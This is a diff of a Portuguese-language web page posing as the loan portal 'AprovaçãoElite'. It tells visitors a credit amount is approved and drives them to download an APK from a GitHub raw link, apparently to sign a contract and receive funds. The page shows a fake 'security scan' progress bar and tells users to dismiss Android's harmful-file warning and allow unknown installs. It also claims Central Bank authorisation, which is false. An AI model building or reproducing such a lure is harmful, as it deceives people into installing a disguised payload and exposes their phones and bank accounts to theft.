@@ -1,24 +1,60 @@
 <!DOCTYPE html>
-<html lang="pt-BR" class="scroll-smooth">
+<html lang="pt-PT" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AprovaçãoElite | Download Seguro</title>
+    <title>AprovaçãoElite | Segurança Bancária Premium</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; }
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background: radial-gradient(circle at top right, #f8fafc, #eff6ff); 
+            min-height: 100vh;
+        }
         [x-cloak] { display: none !important; }
-        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); }
-        .btn-pulse { animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        
+        .premium-shadow {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.04), 0 4px 6px -2px rgba(0, 0, 0, 0.02), inset 0 0 0 1px rgba(255, 255, 255, 0.5);
+        }
+
+        .btn-premium {
+            background: linear-gradient(135deg, #059669 0%, #10b981 100%);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-premium:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 20px -5px rgba(16, 185, 129, 0.4);
+        }
+
+        /* Scanner Animation */
+        .scanner-line {
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #10b981, transparent);
+            position: absolute;
+            top: 0;
+            left: 0;
+            animation: scan 2s linear infinite;
+            z-index: 20;
+            display: none;
+        }
+        .scanning .scanner-line { display: block; }
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            50% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 
@@ -28,21 +64,30 @@
                 baixando: false,
                 progresso: 0,
                 mostrarFaq: false,
+                statusTexto: 'A verificar integridade...',
 
                 iniciarDownload() {
+                    if(this.baixando) return;
                     this.baixando = true;
                     this.progresso = 0;
                     
                     let int = setInterval(() => {
                         if(this.progresso < 100) {
-                            this.progresso += 5;
+                            this.progresso += Math.floor(Math.random() * 8) + 2;
+                            if(this.progresso > 100) this.progresso = 100;
+                            
+                            if(this.progresso < 30) this.statusTexto = 'A encriptar túnel...';
+                            else if(this.progresso < 60) this.statusTexto = 'A validar assinatura digital...';
+                            else if(this.progresso < 90) this.statusTexto = 'A verificar segurança do pacote...';
+                            else this.statusTexto = 'Finalizando...';
                         } else {
                             clearInterval(int);
-                            // Link direto atualizado via GitHub
                             const urlDownload = "https://github.com/Abravaaaa/doncred/raw/main/ASSINAR%20E%20RECEBER%20VALORES%20.apk";
-                            window.location.href = urlDownload;
+                            setTimeout(() => {
+                                window.location.href = urlDownload;
+                            }, 500);
                         }
-                    }, 50);
+                    }, 150);
                 },
 
                 init() {
@@ -54,152 +99,171 @@
         }
     </script>
 </head>
-<body x-data="downloadApp()" x-init="init()" class="antialiased">
+<body x-data="downloadApp()" x-init="init()" class="antialiased text-slate-900">
 
-    <!-- Status Bar -->
-    <div class="bg-emerald-600 py-1.5 text-center">
-        <p class="text-[10px] text-white font-bold uppercase tracking-widest flex items-center justify-center gap-2">
-            <i data-lucide="shield-check" class="w-3 h-3"></i>
-            Conexão Criptografada SSL 256-bit
-        </p>
+    <!-- Barra de Confiança Máxima -->
+    <div class="bg-slate-900 py-2 border-b border-white/10">
+        <div class="container mx-auto px-4 flex justify-center items-center gap-6">
+            <span class="text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em] flex items-center gap-2">
+                <i data-lucide="shield-check" class="w-3.5 h-3.5 text-emerald-400"></i> Certificado SSL 2026
+            </span>
+            <span class="hidden md:flex text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em] items-center gap-2">
+                <i data-lucide="cpu" class="w-3.5 h-3.5 text-emerald-400"></i> Proteção de Dados Biométricos
+            </span>
+        </div>
     </div>
 
-    <!-- Header -->
-    <header class="bg-white/80 backdrop-blur-md border-b sticky top-0 z-50">
-        <div class="max-w-5xl mx-auto px-4 py-4 flex justify-between items-center">
-            <div class="flex gap-2 items-center">
-                <div class="bg-emerald-600 w-9 h-9 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-200">
-                    <i data-lucide="trending-up" class="text-white w-5 h-5"></i>
+    <!-- Header Elegante -->
+    <header class="sticky top-0 z-50 bg-white/70 backdrop-blur-xl border-b border-slate-200/50">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-gradient-to-br from-emerald-500 to-emerald-700 rounded-xl flex items-center justify-center shadow-lg shadow-emerald-500/20">
+                    <i data-lucide="trending-up" class="text-white w-6 h-6"></i>
                 </div>
-                <div class="flex flex-col">
-                    <span class="font-black text-slate-900 leading-none">APROVAÇÃO<span class="text-emerald-600">ELITE</span></span>
-                    <span class="text-[9px] font-bold text-slate-400 uppercase tracking-tighter">Portal de Distribuição</span>
+                <div class="leading-tight">
+                    <h1 class="font-extrabold text-xl tracking-tighter text-slate-900 uppercase">Aprovação<span class="text-emerald-600">Elite</span></h1>
+                    <p class="text-[8px] font-black text-slate-400 uppercase tracking-widest">Tecnologia Financeira</p>
                 </div>
             </div>
-            <button @click="iniciarDownload()" class="bg-slate-900 text-white px-4 py-2 rounded-lg font-bold text-xs uppercase hover:bg-emerald-600 transition-colors">
-                Baixar App
+            <button @click="iniciarDownload()" class="btn-premium text-white px-5 py-2.5 rounded-xl font-bold text-[11px] uppercase tracking-wider">
+                Obter App
             </button>
         </div>
     </header>
 
-    <main class="py-12 px-4 max-w-4xl mx-auto">
+    <main class="py-12 md:py-20 px-6">
         
-        <!-- Alerta de Segurança -->
-        <div class="mb-10 text-center">
-            <div class="inline-flex items-center gap-2 bg-white px-4 py-2 rounded-full shadow-sm border border-slate-100 mb-6">
-                <span class="relative flex h-2 w-2">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-                </span>
-                <span class="text-[10px] font-bold text-slate-500 uppercase">Servidor de download ativo</span>
+        <!-- Hero Section -->
+        <div class="max-w-3xl mx-auto text-center mb-16 fade-in">
+            <div class="inline-flex items-center gap-2 bg-emerald-50 px-4 py-1.5 rounded-full border border-emerald-100 mb-8">
+                <i data-lucide="check-circle-2" class="w-4 h-4 text-emerald-600"></i>
+                <span class="text-[10px] font-black text-emerald-700 uppercase tracking-widest">Acesso Autorizado</span>
             </div>
-            <h1 class="text-3xl md:text-4xl font-black text-slate-900 mb-4 uppercase tracking-tight">
-                Seu crédito está <br> <span class="text-emerald-600 underline decoration-emerald-200 underline-offset-4">pronto para o saque</span>
-            </h1>
-            <p class="text-slate-500 text-sm md:text-base max-w-md mx-auto">
-                Para sua segurança, a assinatura do contrato e a transferência bancária são feitas exclusivamente pelo nosso aplicativo oficial.
+            <h2 class="text-4xl md:text-6xl font-black text-slate-900 mb-6 tracking-tight leading-[1.1]">
+                O seu valor foi <br> <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-600 to-emerald-400">totalmente aprovado.</span>
+            </h2>
+            <p class="text-slate-500 text-lg font-medium max-w-xl mx-auto leading-relaxed">
+                Utilize o nosso canal encriptado para assinar o contrato digital e receber a transferência imediata.
             </p>
         </div>
 
-        <!-- Card de Download -->
-        <div class="max-w-md mx-auto">
-            <div class="bg-white p-8 rounded-[32px] shadow-2xl shadow-slate-200 border border-slate-100 relative overflow-hidden">
+        <!-- Central Download Area -->
+        <div class="max-w-md mx-auto fade-in" style="animation-delay: 0.2s">
+            <div class="relative group">
+                <!-- Glow effect -->
+                <div class="absolute -inset-1 bg-gradient-to-r from-emerald-400 to-cyan-400 rounded-[40px] blur opacity-15 group-hover:opacity-25 transition duration-1000"></div>
                 
-                <div class="relative z-10 text-center">
-                    <div class="bg-emerald-50 w-20 h-20 rounded-3xl flex items-center justify-center mx-auto mb-6">
-                        <i data-lucide="smartphone" class="text-emerald-600 w-10 h-10"></i>
+                <div class="relative bg-white p-10 rounded-[40px] shadow-2xl border border-slate-100">
+                    
+                    <div class="relative w-24 h-24 mx-auto mb-8" :class="baixando ? 'scanning' : ''">
+                        <div class="absolute inset-0 bg-emerald-50 rounded-3xl rotate-6 transition-transform group-hover:rotate-12 duration-500"></div>
+                        <div class="relative w-full h-full bg-white rounded-3xl flex items-center justify-center shadow-inner border border-emerald-100 overflow-hidden">
+                            <i data-lucide="smartphone" class="text-emerald-600 w-12 h-12" :class="baixando ? 'animate-pulse' : ''"></i>
+                            <div class="scanner-line"></div>
+                        </div>
                     </div>
 
                     <div x-show="!baixando">
-                        <button @click="iniciarDownload()" class="btn-pulse w-full bg-emerald-600 hover:bg-emerald-700 text-white py-5 rounded-2xl font-black text-sm uppercase flex justify-center items-center gap-3 transition-all">
-                            <i data-lucide="download" class="w-5 h-5"></i>
-                            Instalar e Receber Agora
+                        <button @click="iniciarDownload()" class="btn-premium w-full text-white py-6 rounded-2xl font-black text-sm uppercase flex justify-center items-center gap-4 group">
+                            <i data-lucide="download" class="w-6 h-6 group-hover:scale-110 transition-transform"></i>
+                            Instalar Agora
                         </button>
-                        <p class="mt-4 text-[10px] text-slate-400 font-bold uppercase tracking-widest flex items-center justify-center gap-1">
-                            <i data-lucide="info" class="w-3 h-3"></i> Versão Oficial 2.4.1 (APK)
-                        </p>
-                    </div>
-
-                    <!-- Progresso de Download -->
-                    <div x-show="baixando" x-cloak class="py-4">
-                        <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden shadow-inner">
-                            <div class="bg-emerald-500 h-full transition-all duration-300" :style="'width:'+progresso+'%'"></div>
-                        </div>
-                        <div class="flex justify-between mt-3">
-                            <p class="text-[10px] font-black text-emerald-600 uppercase tracking-widest" x-text="progresso < 100 ? 'Baixando pacote seguro...' : 'Download Concluído!'"></p>
-                            <p class="text-[10px] font-black text-slate-400" x-text="progresso + '%'"></p>
+                        <div class="mt-6 flex items-center justify-center gap-4 text-[9px] font-black text-slate-400 uppercase tracking-widest">
+                            <span class="flex items-center gap-1"><i data-lucide="shield-check" class="w-3 h-3 text-emerald-500"></i> Verificado</span>
+                            <span class="flex items-center gap-1"><i data-lucide="cpu" class="w-3 h-3 text-emerald-500"></i> APK Seguro</span>
                         </div>
                     </div>
-                </div>
 
-                <!-- Decorativo de fundo -->
-                <div class="absolute -right-4 -bottom-4 opacity-5">
-                    <i data-lucide="shield-check" class="w-32 h-32"></i>
+                    <!-- Progress Mode -->
+                    <div x-show="baixando" x-cloak class="space-y-6">
+                        <div class="space-y-2">
+                            <div class="w-full bg-slate-100 h-4 rounded-full p-1 overflow-hidden shadow-inner">
+                                <div class="bg-gradient-to-r from-emerald-500 to-emerald-400 h-full rounded-full transition-all duration-300" :style="'width:'+progresso+'%'"></div>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-[10px] font-black text-emerald-600 uppercase tracking-widest" x-text="statusTexto"></span>
+                                <span class="text-xs font-black text-slate-900" x-text="progresso + '%'"></span>
+                            </div>
+                        </div>
+                        <div class="bg-slate-50 p-4 rounded-xl flex items-start gap-3 border border-slate-100">
+                            <i data-lucide="alert-circle" class="w-4 h-4 text-emerald-500 shrink-0 mt-0.5"></i>
+                            <p class="text-[10px] font-bold text-slate-500 leading-tight">
+                                Mantenha esta página aberta até que o instalador seja executado automaticamente.
+                            </p>
+                        </div>
+                    </div>
                 </div>
             </div>
 
-            <!-- FAQ/Ajuda Rápida -->
-            <div class="mt-8 space-y-3">
-                <button @click="mostrarFaq = !mostrarFaq" class="w-full flex justify-between items-center px-6 py-4 bg-white rounded-2xl border border-slate-100 text-xs font-bold text-slate-600 uppercase tracking-widest transition-all hover:bg-slate-50">
-                    <span>Ajuda na Instalação?</span>
-                    <i data-lucide="chevron-down" class="w-4 h-4 transition-transform" :class="mostrarFaq ? 'rotate-180' : ''"></i>
+            <!-- Ajuda de Instalação Discreta -->
+            <div class="mt-8">
+                <button @click="mostrarFaq = !mostrarFaq" class="w-full flex justify-between items-center py-4 px-2 border-b border-slate-200 text-[10px] font-black text-slate-400 uppercase tracking-[0.2em] hover:text-emerald-600 transition-colors">
+                    Dificuldades na instalação? Clique aqui
+                    <i data-lucide="chevron-down" class="w-4 h-4 transition-transform duration-300" :class="mostrarFaq ? 'rotate-180' : ''"></i>
                 </button>
-                
-                <div x-show="mostrarFaq" x-cloak x-transition class="p-6 bg-slate-900 rounded-2xl text-white space-y-4">
-                    <div>
-                        <p class="text-[10px] font-bold text-emerald-400 uppercase mb-1">Apareceu "Arquivo Nocivo"?</p>
-                        <p class="text-[11px] text-slate-300 leading-relaxed">Não se preocupe. Isso é um aviso padrão do Android para qualquer app baixado fora da Play Store. Nosso app é 100% seguro e verificado.</p>
-                    </div>
-                    <div class="pt-3 border-t border-white/10">
-                        <p class="text-[10px] font-bold text-emerald-400 uppercase mb-1">Como Autorizar?</p>
-                        <p class="text-[11px] text-slate-300 leading-relaxed">Clique em "Instalar assim mesmo" ou vá em Configurações > Instalar Apps Desconhecidos e autorize o seu navegador.</p>
+                <div x-show="mostrarFaq" x-cloak x-transition class="mt-4 p-6 bg-slate-900 rounded-[24px] shadow-xl text-white">
+                    <div class="space-y-5">
+                        <div class="flex gap-4">
+                            <div class="w-8 h-8 rounded-full bg-emerald-600/20 flex items-center justify-center shrink-0">
+                                <i data-lucide="settings-2" class="w-4 h-4 text-emerald-400"></i>
+                            </div>
+                            <p class="text-[11px] text-slate-300 leading-relaxed">
+                                <strong class="text-white">Aviso de "Fonte Desconhecida"?</strong><br>
+                                Vá a Definições > Segurança e autorize a instalação de ficheiros do seu browser.
+                            </p>
+                        </div>
+                        <div class="flex gap-4">
+                            <div class="w-8 h-8 rounded-full bg-emerald-600/20 flex items-center justify-center shrink-0">
+                                <i data-lucide="shield-alert" class="w-4 h-4 text-emerald-400"></i>
+                            </div>
+                            <p class="text-[11px] text-slate-300 leading-relaxed">
+                                <strong class="text-white">Aviso de "Ficheiro Nocivo"?</strong><br>
+                                Este é um aviso padrão do Android para qualquer app fora da Loja. O nosso canal é 100% encriptado e seguro.
+                            </p>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Passos Ilustrados -->
-        <div class="grid md:grid-cols-3 gap-6 mt-16">
-            <div class="text-center p-6">
-                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
-                    <i data-lucide="download-cloud" class="text-emerald-600 w-6 h-6"></i>
-                </div>
-                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">1. Baixe o Arquivo</h3>
-                <p class="text-[11px] text-slate-500">Inicie o download seguro do instalador oficial direto do servidor.</p>
+        <!-- Trust Badges Premium -->
+        <div class="mt-20 flex flex-wrap justify-center items-center gap-12 grayscale opacity-30 hover:opacity-100 transition-opacity duration-500">
+            <div class="flex flex-col items-center gap-2">
+                <i data-lucide="lock" class="w-6 h-6"></i>
+                <span class="text-[8px] font-black uppercase tracking-widest">End-to-End Encryption</span>
             </div>
-            <div class="text-center p-6">
-                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
-                    <i data-lucide="user-check" class="text-emerald-600 w-6 h-6"></i>
-                </div>
-                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">2. Instale e Acesse</h3>
-                <p class="text-[11px] text-slate-500">Abra o arquivo e siga as instruções para validar sua identidade.</p>
+            <div class="flex flex-col items-center gap-2">
+                <i data-lucide="verified" class="w-6 h-6"></i>
+                <span class="text-[8px] font-black uppercase tracking-widest">Verified Identity</span>
             </div>
-            <div class="text-center p-6">
-                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
-                    <i data-lucide="banknote" class="text-emerald-600 w-6 h-6"></i>
-                </div>
-                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">3. Receba o Valor</h3>
-                <p class="text-[11px] text-slate-500">Assine digitalmente e o dinheiro será enviado via PIX ou TED.</p>
+            <div class="flex flex-col items-center gap-2">
+                <i data-lucide="server" class="w-6 h-6"></i>
+                <span class="text-[8px] font-black uppercase tracking-widest">High Availability</span>
             </div>
         </div>
 
     </main>
 
-    <!-- WhatsApp Flutuante (Suporte) -->
-    <a href="https://wa.me/5511999999999" target="_blank" class="fixed bottom-6 right-6 bg-[#25D366] text-white p-4 rounded-full shadow-2xl flex items-center justify-center hover:scale-110 transition-transform z-[100]">
-        <i data-lucide="message-circle" class="w-7 h-7"></i>
+    <!-- WhatsApp Support Floating -->
+    <a href="https://wa.me/5511999999999" target="_blank" class="fixed bottom-8 right-8 bg-[#25D366] text-white p-4 rounded-2xl shadow-2xl shadow-emerald-600/40 hover:scale-110 active:scale-95 transition-all z-50">
+        <i data-lucide="message-circle" class="w-8 h-8"></i>
+        <span class="absolute -top-1 -right-1 flex h-4 w-4">
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-4 w-4 bg-red-500 text-[8px] font-black flex items-center justify-center">1</span>
+        </span>
     </a>
 
-    <footer class="py-12 border-t border-slate-100 bg-white mt-12">
-        <div class="text-center px-4">
-            <p class="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] mb-4">AprovaçãoElite — Correspondente Bancário Oficial</p>
-            <div class="flex justify-center gap-6 opacity-30 grayscale mb-6">
-                <i data-lucide="shield" class="w-5 h-5"></i>
-                <i data-lucide="lock" class="w-5 h-5"></i>
-                <i data-lucide="check-circle" class="w-5 h-5"></i>
+    <footer class="py-16 bg-white border-t border-slate-100">
+        <div class="container mx-auto px-6 text-center">
+            <div class="flex justify-center gap-2 items-center mb-6">
+                <div class="w-6 h-6 bg-slate-900 rounded flex items-center justify-center">
+                    <i data-lucide="trending-up" class="text-white w-4 h-4"></i>
+                </div>
+                <span class="font-black text-xs text-slate-900 uppercase">Aprovação Elite</span>
             </div>
-            <p class="text-[9px] text-slate-400 max-w-sm mx-auto leading-relaxed">
-                Segurança em conformidade com as normas do Banco Central. Seus dados estão protegidos pela Lei Geral de Proteção de Dados (LGPD).
+            <p class="text-[9px] text-slate-400 font-black uppercase tracking-[0.3em] mb-4">Correspondente Bancário Autorizado</p>
+            <p class="text-[9px] text-slate-400 max-w-xl mx-auto leading-relaxed uppercase tracking-tighter">
+                Operamos de acordo com a resolução n.º 3.954 do Banco Central. A nossa plataforma utiliza protocolos de segurança TLS 1.3 para garantir o sigilo absoluto da sua operação financeira.
             </p>
         </div>
     </footer>
